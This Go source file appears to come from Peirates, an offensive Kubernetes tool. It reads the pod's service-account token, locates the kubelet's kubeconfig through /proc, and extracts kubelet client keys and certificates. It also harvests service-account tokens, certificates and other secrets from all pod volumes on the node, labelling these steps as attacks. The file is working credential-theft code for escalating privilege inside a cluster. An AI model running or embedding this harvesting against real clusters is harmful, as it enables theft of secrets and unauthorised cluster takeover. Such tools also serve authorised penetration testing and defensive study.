//Build API configuration (svc account token, namespace, API server) -- automated prereq for other steps

package peirates

import (
	"bufio"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"os/exec"
	"regexp"
	"strings"

	"gopkg.in/yaml.v3"
)

const ServiceAccountPath = "/var/run/secrets/kubernetes.io/serviceaccount/"

type ServerInfo struct {
	APIServer      string // URL for the API server - this replaces RIPAddress and RPort
	Token          string // service account token ASCII text, if present
	TokenName      string // name of the service account token, if present
	ClientCertData string // client certificate, if present
	ClientKeyData  string // client key, if present
	ClientCertName string // name of the client cert, if present
	CAPath         string // path to Certificate Authority's certificate (public key)
	CACertData     string // contents of the Certificate Authority's certificate, if we've read one at any point.
	Namespace      string // namespace that this pod's service account is tied to
	UseAuthCanI    bool
	ignoreTLS      bool // Should we ignore TLS checking on API server requests?
}

func ImportPodServiceAccountToken() ServerInfo {

	// Creating an object of ServerInfo type, which we'll poppulate in this function.
	var configInfoVars ServerInfo

	// Check to see if the configuration information we require is in environment variables and
	// a token file, as it would be in a running pod under default configuration.

	// Read IP address and port number for API server out of environment variables
	IPAddress := os.Getenv("KUBERNETES_SERVICE_HOST")
	port := os.Getenv("KUBERNETES_SERVICE_PORT")
	configInfoVars.APIServer = "https://" + IPAddress + ":" + port

	// Reading token file and storing in variable token
	const tokenFile = ServiceAccountPath + "token"
	token, errRead := os.ReadFile(tokenFile)

	// Only return output if a JWT was found.
	if errRead == nil {
		configInfoVars.Token = string(token)
		fmt.Println("Read a service account token from " + tokenFile)

		// Try naming the service account token with its JWT name
		name := ""
		_, tokenSubField, err := parseServiceAccountJWT_return_sub(configInfoVars.Token)
		if err != nil {
			printIfVerbose("DEBUG: ImportPodServiceAccountToken() found a service account JWT that didn't parse properly.", Verbose)
		} else if !strings.HasPrefix(tokenSubField, "system:serviceaccount:") {
			printIfVerbose("DEBUG: ImportPodServiceAccountToken() found a service account JWT that where the sub didn't start with system:serviceaccount:", Verbose)
		} else {
			lenPrefix := len("system:serviceaccount:")
			name = tokenSubField[lenPrefix:]
		}

		if name != "" {
			configInfoVars.TokenName = name
		} else {
			// otherwise, name the token for its hostname / pod
			configInfoVars.TokenName = "Pod ns:" + configInfoVars.Namespace + ":" + os.Getenv("HOSTNAME")
		}
	}

	// Reading namespace file and store in variable namespace
	namespace, errRead := os.ReadFile(ServiceAccountPath + "namespace")
	if errRead == nil {
		configInfoVars.Namespace = string(namespace)
	}

	// Attempt to read a ca.crt file from the normal pod location - store if found.
	expectedCACertPath := ServiceAccountPath + "ca.crt"
	CACertBytes, err := os.ReadFile(expectedCACertPath)
	if err == nil {
		configInfoVars.CAPath = expectedCACertPath
		configInfoVars.CACertData = string(CACertBytes)
	}

	return configInfoVars
}

func getKubeletKubeconfigPath() (string, error) {

	// Open the /proc directory
	printIfVerbose("DEBUG: Reading /proc to determine if a kubelet is visible.", Verbose)
	printIfVerbose("DEBUG: Opening /proc directory for reading...", Verbose)

	dir, err := os.Open("/proc")
	if err != nil {
		printIfVerbose("DEBUG: Error opening /proc: "+err.Error(), Verbose)
		return "", err
	}
	defer dir.Close()

	// List all entries in the /proc directory
	printIfVerbose("DEBUG: Reading directory contents from /proc.", Verbose)

	procs, err := dir.Readdirnames(-1)
	if err != nil {
		fmt.Println("DEBUG: Error reading /proc:", err)
		return "", err
	}

	// Look for the kubelet process by checking cmdline for each process
	for _, pid := range procs {
		printIfVerbose("DEBUG: Checking PID "+pid+" for kubelet.", Verbose)

		args, err := getCmdLine(pid)
		if err != nil || len(args) == 0 {
			continue
		}

		// Find the "kubelet" process and return its kubeconfig path
		if strings.Contains(args[0], "kubelet") {
			printIfVerbose("DEBUG: Found kubelet process with PID "+pid, Verbose)

			kubeConfig := findFlagValue(args, "--kubeconfig")
			if kubeConfig != "" {
				printIfVerbose(fmt.Sprintf("DEBUG: Kubelet is running with PID %s and uses kubeconfig: %s\n", pid, kubeConfig), Verbose)
				return kubeConfig, nil
			} else {
				printIfVerbose("DEBUG: Kubelet is running with PID "+pid+" but no kubeconfig found.", Verbose)
			}
		}
	}

	printIfVerbose("DEBUG: Kubelet config file command line parameter not found.", Verbose)
	return "", errors.New("kubelet not found")
}

func checkForNodeCredentials(clientCertificates *[]ClientCertificateKeyPair, configInfoVars *ServerInfo) error {

	// Paths to explore:
	// /var/lib/kubelet/kubeconfig
	// /etc/kubernetes/kubeconfig
	// /etc/kubernetes/kubelet.conf
	// <whatever path you get from checking the kubeconfig command line argument>

	// Determine if one of the paths above exists and use it to get kubelet keypairs
	kubeletKubeconfigFilePaths := make([]string, 0)

	psDiscoveredPath, err := getKubeletKubeconfigPath()
	if err == nil {
		kubeletKubeconfigFilePaths = append(kubeletKubeconfigFilePaths, psDiscoveredPath)
	} else {
		printIfVerbose("DEBUG: Kubelet config file command line parameter not found - error message was "+err.Error(), Verbose)
	}

	kubeletKubeconfigFilePaths = append(kubeletKubeconfigFilePaths, "/var/lib/kubelet/kubeconfig")
	kubeletKubeconfigFilePaths = append(kubeletKubeconfigFilePaths, "/etc/kubernetes/kubeconfig")
	kubeletKubeconfigFilePaths = append(kubeletKubeconfigFilePaths, "/etc/kubernetes/kubelet.conf")
	kubeletKubeconfigFilePaths = append(kubeletKubeconfigFilePaths, "/var/snap/microk8s/current/credentials/kubelet.config")

	for _, path := range kubeletKubeconfigFilePaths {
		// On each path, check for existence of the file.
		printIfVerbose("DEBUG: Checking for kubelet's kubeconfig at "+path, Verbose)
		if _, err := os.Stat(path); os.IsNotExist(err) {
			printIfVerbose("checkForNodeCredentials() - path does not exist: "+path, Verbose)
			continue
		}

		printIfVerbose("checkForNodeCredentials() - Reading kubelet's kubeconfig from "+path, Verbose)
		kubeconfigFile, err := os.ReadFile(path)
		if err != nil {
			println("ERROR: could not open file " + path)
			continue
		}

		printIfVerbose("Reading kubelet's kubeconfig from "+path, Verbose)

		config := make(map[interface{}]interface{})
		err = yaml.Unmarshal(kubeconfigFile, &config)
		if err != nil {
			println("ERROR: could not unmarshall YAML in file " + path)
			continue
		}

		// Get the CA cert from
		// clusters[0].cluster.certificate-authority-data (actual cert)
		// OR
		// clusters[0].cluster.certificate-authority (path to cert)

		// Get the server IP from:
		// clusters[0].cluster.server

		// Get the client-key-data from:
		// users[0].user.client-key-data
		// Bonus: get the user name from:
		// users[0].user.name
		// Bonus: get client-certificate-data from :
		// users[0].user.client-certificate-data

		// First, parse the API server URL and CA Cert from the "clusters" top-level data structure.
		clustersSection := config["clusters"].([]interface{})
		if clustersSection == nil {
			printIfVerbose("DEBUG: no clusters section found in kubelet's kubeconfig file", Verbose)
			continue
		}
		firstCluster := clustersSection[0].(map[string]interface{})
		if firstCluster == nil {
			printIfVerbose("DEBUG: no first cluster found in kubelet's kubeconfig file", Verbose)
			continue
		}
		clusterSection := firstCluster["cluster"].(map[string]interface{})
		if clusterSection == nil {
			printIfVerbose("DEBUG: no cluster item found in first cluster's item", Verbose)
			continue
		}
		APIServer := clusterSection["server"].(string)
		printIfVerbose("DEBUG: API Server found in kubelet's kubeconfig file: "+APIServer, Verbose)

		// Check for either a certificate-authority key or a certificate-authority-data key.
		CACertFilepathBytes, CACertFileFound := clusterSection["certificate-authority"]
		CACertBase64EncodedBytes, CACertContentsFound := clusterSection["certificate-authority-data"]

		var CACertBytes []byte
		if CACertFileFound {
			CACertFilepath := CACertFilepathBytes.(string)
			printIfVerbose("DEBUG: Reading CA cert from "+CACertFilepath, Verbose)
			CACertBytes, err = os.ReadFile(CACertFilepath)
			if err != nil {
				println("[-] ERROR: couldn't decode the CA cert from the file path (" + CACertFilepath + ") in the kubelet's kubeconfig file")
				continue
			}
			configInfoVars.CAPath = CACertFilepath

		} else if CACertContentsFound {
			CACertBase64Encoded := CACertBase64EncodedBytes.(string)

			// Decode the CA cert
			CACertBytes, err = base64.StdEncoding.DecodeString(CACertBase64Encoded)
			if err != nil {
				println("[-] ERROR: couldn't decode the CA cert found in the kubelet's kubeconfig file")
				continue
			}
		} else {
			println("[-] ERROR: could not find a CA cert in the kubelet's kubeconfig file")
			continue
		}

		CACert := string(CACertBytes)
		// Store the CACert in the configInfoVars structure in case this kubelet's kubeconfig file isn't fully parsed - we can still
		// get the CA cert.
		configInfoVars.CACertData = CACert

		printIfVerbose(("DEBUG: CA Cert found and decoded from kubelet's kubeconfig file"), Verbose)

		// Next, parse the "users" top-level data structure to get the kubelet's credentials
		// This could either be data encoded straight into this file or can be a file path to find the data in.
		// In the former case, data is in "client-key-data". In the latter case, the filepath is in "client-key".

		usersSection := config["users"].([]interface{})
		firstUser := usersSection[0].(map[string]interface{})
		username := firstUser["name"].(string)

		credentials := firstUser["user"].(map[string]interface{})
		var keyData string
		var certData string
		var ok bool

		//
		// Handle the case where the client key and cert are contained directly in this data structure
		//

		if _, ok = credentials["client-key-data"]; ok {
			keyDataBase64Encoded := credentials["client-key-data"].(string)
			keyDataBytes, err := base64.StdEncoding.DecodeString(keyDataBase64Encoded)
			if err != nil {
				println("[-] ERROR: couldn't decode the user private key found in the kubelet's kubeconfig file")
				continue
			}

			keyData = string(keyDataBytes)

		}
		if _, ok = credentials["client-certificate-data"]; ok {
			certDataBase64Encoded := credentials["client-certificate-data"].(string)
			certDataBytes, err := base64.StdEncoding.DecodeString(certDataBase64Encoded)
			if err != nil {
				println("[-] ERROR: couldn't decode the user certificate found in the kubelet's kubeconfig file")
				continue
			}

			certData = string(certDataBytes)

		}

		//
		// Handle the case where the client key and cert are contained in files named by this data structure
		//

		// First, do the client-key
		if _, ok = credentials["client-key"]; ok {
			path := credentials["client-key"].(string)

			if _, err := os.Stat(path); os.IsNotExist(err) {
				println("ERROR: kubelet kubeconfig file names " + path + " as holding its key, but this file does not exist.")
				continue
			}
			contents, err := os.ReadFile(path)
			if err != nil {
				println("ERROR: kubelet kubeconfig file names " + path + " as holding its key, but cannot read this file.")
				continue
			}
			keyData = string(contents)
		}

		if _, ok = credentials["client-certificate"]; ok {
			path := credentials["client-certificate"].(string)

			if _, err := os.Stat(path); os.IsNotExist(err) {
				println("ERROR: kubelet kubeconfig file names " + path + " as holding its cert, but this file does not exist.")
				continue
			}
			contents, err := os.ReadFile(path)
			if err != nil {
				println("ERROR: kubelet kubeconfig file names " + path + " as holding its cert, but cannot read this file.")
				continue
			}
			certData = string(contents)
		}

		// Feature request: abstract this to parse any client certificate items, not just kubelet.
		//                  We should then support the kube-proxy config, as well as the config
		//					in the KUBECONFIG environment variable and ~/.kube/config if they exist.

		// If we got a kubelet credential, store it.
		if len(keyData) > 0 && len(certData) > 0 {
			println("\n[+] Found Kubelet certificate and secret key: " + username + "\n")

			var thisClientCertKeyPair ClientCertificateKeyPair
			thisClientCertKeyPair.ClientCertificateData = certData
			thisClientCertKeyPair.ClientKeyData = keyData
			thisClientCertKeyPair.Name = username

			// Parse out the API Server
			thisClientCertKeyPair.APIServer = APIServer
			// Parse out the CA Cert into a string.
			thisClientCertKeyPair.CACert = CACert

			*clientCertificates = append(*clientCertificates, thisClientCertKeyPair)

			break
		} else {
			printIfVerbose("DEBUG: No client key or cert found in kubelet's kubeconfig file", Verbose)
		}

	}

	return (nil)
}

// Add the service account tokens for any pods found in /var/lib/kubelet/pods/. Also, harvest secrets.
func gatherPodCredentials(serviceAccounts *[]ServiceAccount, interactive bool, runFromMenu bool) {

	// Exit if /var/lib/kubelet/pods does not exist
	const kubeletPodsDir = "/var/lib/kubelet/pods/"
	if _, err := os.Stat(kubeletPodsDir); os.IsNotExist(err) {
		if runFromMenu {
			println("Attack fails - path does not exist: ", kubeletPodsDir)
		}
		return
	}

	// Store a count of how many service accounts are currently held, so we can report if we found new ones.
	startingNumberServiceAccounts := len(*serviceAccounts)

	// Set a boolean for whether we need to pause to tell the user about new service accounts or non-token secrets.
	// FEATURE REQUEST: create a loot data structure for non-token secrets found on nodes.
	pauseOnExit := false

	// Read the directory for a list of subdirs (pods)
	dirs, err := os.ReadDir(kubeletPodsDir)
	if err != nil {
		if runFromMenu {
			println("Attack fails - cannot read ", kubeletPodsDir)
		}
		return
	}

	var nonTokenSecrets []SecretFromPodViaNodeFS
	var certsFound []string

	/* #gosec G101 - this is not a hardcoded credential */
	const podVolumeSecretDir = "/volumes/kubernetes.io~secret/"

	for _, pod := range dirs {

		podName := getPodName(kubeletPodsDir, pod.Name())

		// In each dir, we are seeking to find its secret volume mounts.
		// Example:
		// ls volumes/kubernetes.io~secret/
		// default-token-5sfvg  registry-htpasswd  registry-pki
		//
		secretPath := kubeletPodsDir + pod.Name() + podVolumeSecretDir

		if _, err := os.Stat(secretPath); os.IsNotExist(err) {
			continue
		}
		secrets, err := os.ReadDir(secretPath)
		if err != nil {
			continue
		}

		for _, secret := range secrets {
			secretName := secret.Name()

			// First, see if this secret is a service account token.
			if strings.Contains(secretName, "-token-") {

				// TODO: Abstract this code to make handling tokens found in podVolumeSecretDir and podVolumeSADir use the same code.

				tokenFilePath := secretPath + secretName + "/token"
				if _, err := os.Stat(tokenFilePath); os.IsNotExist(err) {
					continue
				}
				tokenBytes, err := os.ReadFile(tokenFilePath)
				if err != nil {
					continue
				}
				token := string(tokenBytes)

				// If possible, name the token for the namespace
				namespacePath := secretPath + "/" + secretName + "/namespace"
				if _, err := os.Stat(namespacePath); os.IsNotExist(err) {
					continue
				}
				namespaceBytes, err := os.ReadFile(namespacePath)
				if err != nil {
					continue
				}
				namespace := string(namespaceBytes)
				fullSecretName := namespace + "/" + secretName
				// FEATURE REQUEST: spell out which node this was found on in the last arg.
				if AddNewServiceAccount(fullSecretName, string(token), "pod secret harvested from node ", serviceAccounts) {
					fmt.Println("[+] Found a service account token in pod " + podName + " on this node: " + fullSecretName)
				}

				// For all other secrets, if they are certificates, we'll parse them for a name.
				// We'll then display the file/dir path to the user so they know what to go get.
			} else {

				// If the secret's directory contains a file ending in .crt, which isn't a ca.crt file, parse
				// it out if an openssl binary is available.

				certFound := false

				thisSecretDirectory := kubeletPodsDir + pod.Name() + podVolumeSecretDir + secretName
				secretDirFiles, err := os.ReadDir(thisSecretDirectory)
				if err != nil {
					continue
				}

				for _, file := range secretDirFiles {
					fileName := file.Name()
					certNameFound := ""
					if strings.HasSuffix(fileName, ".crt") || strings.HasSuffix(fileName, ".cert") {
						if fileName != "ca.crt" {

							// FEATURE REQUEST: Should we confirm that there's a matching secret key?

							command := "openssl"
							argumentsLine := "x509 -in " + thisSecretDirectory + "/" + fileName + " -noout -text"
							arguments := strings.Fields(argumentsLine)

							/* #gosec G204 - this code runs the openssl command file names and directories found in the directory structure */
							cmd := exec.Command(command, arguments...)
							out, err := cmd.CombinedOutput()

							if err != nil {
								printIfVerbose("DEBUG: running command failed with "+err.Error(), Verbose)
								continue
							}
							printIfVerbose(fmt.Sprintf("DEBUG: Certificate is \n%s\n", string(out)), Verbose)

							// Now find a Subject line:

							for _, line := range strings.Split(string(out), "\n") {
								if !strings.Contains(line, "Subject:") {
									continue
								}
								line := strings.TrimSpace(line)
								subjectValue := strings.TrimPrefix(line, "Subject: ")
								certNameFound = strings.TrimSpace(subjectValue)

								printIfVerbose("DEBUG: subject value was : "+subjectValue, Verbose)

								break

							}

						}

					}

					// FEATURE REQUEST: refactor these so we can manage cert secrets and non-token-non-cert secrets globallly.
					if certNameFound != "" {
						// certificate := CertificateSecret{
						// 	certName : certNameFound,
						// 	secretName: secretName
						// 	podAssociated: podName,
						// 	fileFoundIn : secretPath+secretName
						// }
						certsFound = append(certsFound, fmt.Sprintf("Found a certificate with subject %s via a secret on the node's filesystem called %s, provided to pod %s, -- explore it with this command:  ls %s", certNameFound, secretName, podName, secretPath+secretName))

						// appendCertificateSecret(certNameFound, secretName, podName, secretPath+secretName, "found via /var/lib/kubelet/ volume.")
						certFound = true
						break
					}

				}

				if !certFound {
					// FEATURE REQUEST: store these paths and their contents, let the user view them any time - please do so similar to
					// AddNewServiceAccount().
					// fmt.Printf("[+] Found a secret on the node's filesystem called %s, provided to pod %s, -- explore it with this command:  ls %s\n", secretName, podName, secretPath+secretName)
					nonTokenOrCertSecret := SecretFromPodViaNodeFS{secretName: secretName, secretPath: secretPath + secretName, podName: podName}

					nonTokenSecrets = append(nonTokenSecrets, nonTokenOrCertSecret)
					// appendMiscSecret(nonTokenOrCertSecret,"found via /var/lib/kubelet/ volume.")

				}
			}
		}

	}

	// As of Kubernetes 1.21, service account tokens are provided through projected volumes, added by the
	// Service Account token admission controller. For now, these are theoretically short-lived, but appear
	// to last for a full year. If this timeline is reduced, we will need to refresh these tokens.
	//
	// References: https://github.com/kubernetes/kubernetes/issues/70679
	//             https://github.com/kubernetes/kubernetes/issues/48408

	// The service account tokens are placed via projected volumes:

	const podVolumeSADir = "/volumes/kubernetes.io~projected/"

	for _, pod := range dirs {

		podName := getPodName(kubeletPodsDir, pod.Name())

		serviceAccountPath := kubeletPodsDir + pod.Name() + podVolumeSADir

		if _, err := os.Stat(serviceAccountPath); os.IsNotExist(err) {
			continue
		}
		serviceAccountDirs, err := os.ReadDir(serviceAccountPath)
		if err != nil {
			continue
		}
		for _, saDir := range serviceAccountDirs {
			saDirName := saDir.Name()
			// First, see if this secret is a service account token.
			if strings.Contains(saDirName, "kube-api-access-") {

				// TODO: Abstract this code to make handling tokens found in podVolumeSecretDir and podVolumeSADir use the same code.

				tokenFilePath := serviceAccountPath + saDirName + "/token"
				if _, err := os.Stat(tokenFilePath); os.IsNotExist(err) {
					continue
				}
				tokenBytes, err := os.ReadFile(tokenFilePath)
				if err != nil {
					continue
				}
				token := string(tokenBytes)

				//				func parseServiceAccountJWT_return_sub(tokenString string) (int64, string, error) {

				_, tokenSubField, err := parseServiceAccountJWT_return_sub(token)
				if err != nil {
					printIfVerbose("DEBUG: gatherPodCredentials() found a service account JWT that didn't parse properly.", Verbose)
					continue
				}
				if !strings.HasPrefix(tokenSubField, "system:serviceaccount:") {
					printIfVerbose("DEBUG: gatherPodCredentials() found a service account JWT that where the sub didn't start with system:serviceaccount:", Verbose)
					continue
				}
				lenPrefix := len("system:serviceaccount:")
				fullSAName := "short-lived-sa/" + tokenSubField[lenPrefix:]

				// FEATURE REQUEST: spell out which node this was found on in the last arg.
				if AddNewServiceAccount(fullSAName, string(token), "pod service account token harvested from node ", serviceAccounts) {
					fmt.Println("[+] Found a short-lived service account token in pod " + podName + " on this node: " + fullSAName)
				}
			}
		}
	}

	newServiceAccountsCount := len(*serviceAccounts) - startingNumberServiceAccounts
	if newServiceAccountsCount > 0 {
		fmt.Printf("\nSUMMARY: %d new service accounts pulled from this node's %s directory. Explore them from the sa-menu item on the main menu.\n\n", newServiceAccountsCount, kubeletPodsDir)
		pauseOnExit = true
	}
	if len(certsFound) > 0 {
		for _, certFoundMessage := range certsFound {
			println(certFoundMessage)
		}
		fmt.Printf("\nSUMMARY: %d certificates found in secrets in this node's %s directory.\n\n", len(certsFound), kubeletPodsDir)
		pauseOnExit = true
	}
	if len(nonTokenSecrets) > 0 {
		for _, thisSecret := range nonTokenSecrets {
			println("Secret *** " + thisSecret.secretName + " *** found on pod with etc hosts entry " + thisSecret.podName + " can be viewed via ls " + thisSecret.secretPath)
		}
		fmt.Printf("\nSUMMARY: %d other secrets found in this node's %s directory.\n\n", len(nonTokenSecrets), kubeletPodsDir)

		pauseOnExit = true
	}
	if pauseOnExit {
		if !runFromMenu {
			pauseToHitEnter(interactive)
		}
	}

}

func getPodName(kubeletPodsDir, podDirName string) string {

	commentedPattern := regexp.MustCompile(`^\s*#`)
	ipv6Pattern := regexp.MustCompile(`^\s*\w*::`)
	ipHostPattern := regexp.MustCompile(`^s*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\s+`)

	// Get the name of the pod from the etc-hosts file the kubelet provides.
	etcHostPath := kubeletPodsDir + podDirName + "/etc-hosts"
	var podName string
	if _, err := os.Stat(etcHostPath); !os.IsNotExist(err) {
		// if the etc-hosts file is there, parse it to find this pod's name
		file, err := os.Open(etcHostPath)
		if err != nil {
			return ""
		}
		scanner := bufio.NewScanner(file)
		scanner.Split(bufio.ScanLines)
		for scanner.Scan() {
			line := strings.TrimSpace(scanner.Text())
			if strings.Contains(line, "localhost") {
				continue
			} else if line == "" {
				continue
			} else if commentedPattern.MatchString(line) {
				continue
			} else if ipv6Pattern.MatchString(line) {
				continue
			} else if ipHostPattern.MatchString(line) {
				// The first line that doesn't match the above patterns is the pod name
				podName = strings.Fields(line)[1]
				break
			} else {
				printIfVerbose("DEBUG: unexpected line type: "+line, Verbose)
			}

		}
	}
	return podName

}

func listNamespaces(connectionString ServerInfo) {
	var err error
	Namespaces, err := GetNamespaces(connectionString)
	if err != nil {
		errorString := "[-] error while listing namespaces"
		println(errorString)
	}
	for namespace := range Namespaces {
		fmt.Println(namespace)
	}
}

// SwitchNamespace switches the current ServerInfo.Namespace to one entered by the user.
func menuSwitchNamespaces(connectionString *ServerInfo) bool {
	var err error
	listNamespaces(*connectionString)

	namespacesList, err := GetNamespaces(*connectionString)
	if err != nil {
		errorString := "[-] error while listing namespaces"
		println(errorString)
	}

	println("\nEnter namespace to switch to or hit enter to maintain current namespace: ")
	input, err := ReadLineStripWhitespace()

	if input != "" {
		// Warn user if namespace is not in the existing namespace list.
		found := false
		for _, ns := range namespacesList {
			if input == ns {
				found = true
			}
		}
		// We might not find the user's input in the list if we weren't able to list namespaces.
		// Let them switch anyway, but give a warning.
		if !found && (len(namespacesList) > 0) {
			println(input + " isn't a valid namespace.")
			return false
		}
		connectionString.Namespace = input
	}
	return true
}

// GetNamespaces returns the list of active namespaces, using kubectl get namespaces
func GetNamespaces(connectionString ServerInfo) ([]string, error) {

	if !kubectlAuthCanI(connectionString, "get", "namespaces") {
		errorString := "[-] Permission Denied: your service account isn't allowed to get namespaces"
		println(errorString)
		println("Consider trying kubectl-try-all get namespaces to see if any RBAC principals you have can do this.")
		return []string{}, errors.New(errorString)
	}

	var namespaces []string

	NamespacesRaw, _, err := runKubectlSimple(connectionString, "get", "namespaces")
	if err != nil {
		errorString := "[-] error while running kubectl get namespaces"
		println(errorString)
		println("Consider trying kubectl-try-all get namespaces to see if any RBAC principals you have can do this.")
		return []string{}, errors.New(errorString)
	}
	// Iterate over kubectl get namespaces, stripping off the first line which matches NAME and then grabbing the first column

	lines := strings.Split(string(NamespacesRaw), "\n")

	emptyString := regexp.MustCompile(`^\s*$`)
	for _, line := range lines {
		if !emptyString.MatchString(line) {
			// Get rid of blank lines
			if strings.Fields(line)[1] == "Active" {
				namespace := strings.Fields(line)[0]
				if namespace != "NAME" {
					namespaces = append(namespaces, namespace)
				}
			}
		}
	}

	return namespaces, nil
}

// Function to get the command line arguments of a process from its PID
func getCmdLine(pid string) ([]string, error) {
	// Read the cmdline file which contains the command line arguments
	data, err := os.ReadFile(fmt.Sprintf("/proc/%s/cmdline", pid))
	if err != nil {
		return nil, err
	}

	// The arguments are null-separated in cmdline, so we split on the null character
	args := strings.Split(string(data), "\x00")
	return args, nil
}

// Function to find the value for a specific flag in the command line arguments
func findFlagValue(args []string, flag string) string {
	printIfVerbose("DEBUG: Checking a process' arguments, looking for flag "+flag, Verbose)
	for _, arg := range args {

		printIfVerbose("DEBUG: Checking argument: "+arg, Verbose)

		if strings.HasPrefix(arg, flag) {
			printIfVerbose("DEBUG: Found flag in: "+arg, Verbose)
			// Split the argument on "=" to separate the flag from its value
			parts := strings.SplitN(arg, "=", 2)
			if len(parts) == 2 {
				printIfVerbose("Found value for flag of "+parts[1], Verbose)
				return parts[1]
			} else {
				printIfVerbose("ERROR: incorrect number of = signs", Verbose)
			}

		}
	}
	return ""
}
